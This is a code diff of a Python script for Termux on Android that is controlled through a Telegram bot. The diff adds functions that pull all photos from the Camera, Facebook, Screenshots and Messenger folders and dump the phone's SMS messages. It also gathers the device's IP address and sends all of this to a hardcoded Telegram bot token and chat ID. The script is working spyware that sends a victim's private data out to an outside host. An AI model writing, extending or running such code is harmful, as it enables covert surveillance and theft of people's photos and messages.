@@ -7,28 +7,21 @@ TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
 CHAT_ID = '6285177516'
 
 # Global variables
-current_folder = "/storage/emulated/0/"
+current_folder = "/data/data/com.termux/files/home/storage/shared/"
 directories_to_search = [
-    "/storage/emulated/0/DCIM/Camera",
-    "/storage/emulated/0/DCIM/Facebook",
-    "/storage/emulated/0/Pictures/Screenshots",
-    "/storage/emulated/0/Pictures/Messenger"
+    "/data/data/com.termux/files/home/storage/shared/DCIM/Camera",
+    "/data/data/com.termux/files/home/storage/shared/DCIM/Facebook",
+    "/data/data/com.termux/files/home/storage/shared/Pictures/Screenshots",
+    "/data/data/com.termux/files/home/storage/shared/Pictures/Messenger"
 ]
-
-# Function to escape special characters for Telegram Markdown
-def escape_markdown(text):
-    escape_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
-    for char in escape_chars:
-        text = text.replace(char, f'\\{char}')
-    return text
 
 # Function to send message or document to Telegram
 def send_to_telegram(message, document=None):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
     data = {
         "chat_id": CHAT_ID,
-        "text": escape_markdown(message),  # Escape special characters
-        "parse_mode": "MarkdownV2"  # Use MarkdownV2 for better support
+        "text": message,
+        "parse_mode": "Markdown"
     }
     
     try:
@@ -81,8 +74,11 @@ def download_file(file_name):
 def handle_folder_navigation(folder_name):
     global current_folder
     try:
-        # Use absolute path to handle folder navigation properly
-        new_folder_path = os.path.abspath(os.path.join(current_folder, folder_name))
+        # Use the correct path for storage in Termux
+        base_path = "/data/data/com.termux/files/home/storage/shared/"
+        
+        # Resolve the absolute path using the base path
+        new_folder_path = os.path.abspath(os.path.join(base_path, folder_name))
         
         if os.path.isdir(new_folder_path):
             current_folder = new_folder_path
@@ -99,11 +95,40 @@ def handle_folder_navigation(folder_name):
     except Exception as e:
         send_to_telegram(f"Error navigating folder: {str(e)}")
 
+# Function to download and send images from specified directories
+def download_and_send_images():
+    try:
+        sent_files = set()
+        for directory in directories_to_search:
+            if os.path.isdir(directory):
+                for filename in os.listdir(directory):
+                    if filename.lower().endswith(('.png', '.jpg')):
+                        src_path = os.path.join(directory, filename)
+                        if filename not in sent_files:
+                            send_to_telegram(f"Sending image `{filename}`...", document=src_path)
+                            sent_files.add(filename)
+        
+        return "All images have been sent to Telegram."
+    except Exception as e:
+        return f"Error sending images: {str(e)}"
+
+# Function to get SMS messages (using Termux API)
+def get_sms_messages():
+    try:
+        result = subprocess.run(['termux-sms-list'], capture_output=True, text=True)
+        if result.returncode == 0:
+            return result.stdout
+        else:
+            return f"Error retrieving SMS messages: {result.stderr}"
+    except Exception as e:
+        return f"Error retrieving SMS messages: {str(e)}"
+
 # Function to get device information
 def get_device_info():
     try:
         device_info = {
             "Device Name": subprocess.run(['termux-info'], capture_output=True, text=True).stdout,
+            "IP Address": subprocess.run(['ip', 'addr', 'show', 'wlan0'], capture_output=True, text=True).stdout,
             "Battery Level": subprocess.run(['termux-battery-status'], capture_output=True, text=True).stdout
         }
         device_info_str = "\n".join([f"{key}: {value}" for key, value in device_info.items()])
@@ -118,13 +143,13 @@ def handle_telegram_update(update):
         if message:
             if message.startswith('/'):
                 if message == '/sms':
-                    send_to_telegram("This command is under construction.")  # Handle SMS logic here
+                    send_to_telegram(get_sms_messages() or "This command is under construction.")
                 elif message == '/device':
-                    send_to_telegram(get_device_info())
+                    send_to_telegram(get_device_info() or "This command is under construction.")
                 elif message == '/sdcard':
-                    handle_folder_navigation("storage/emulated/0")
+                    handle_folder_navigation("")
                 elif message == '/download_images':
-                    send_to_telegram("This command is under construction.")  # Handle image logic here
+                    send_to_telegram(download_and_send_images())
                 else:
                     send_to_telegram(f"Unknown command `{message}`.")
             else:
@@ -134,6 +159,7 @@ def handle_telegram_update(update):
                 else:
                     response_message = download_file(message)
                     send_to_telegram(response_message)
+    
     except Exception as e:
         send_to_telegram(f"Error in Telegram update: {str(e)}")
 
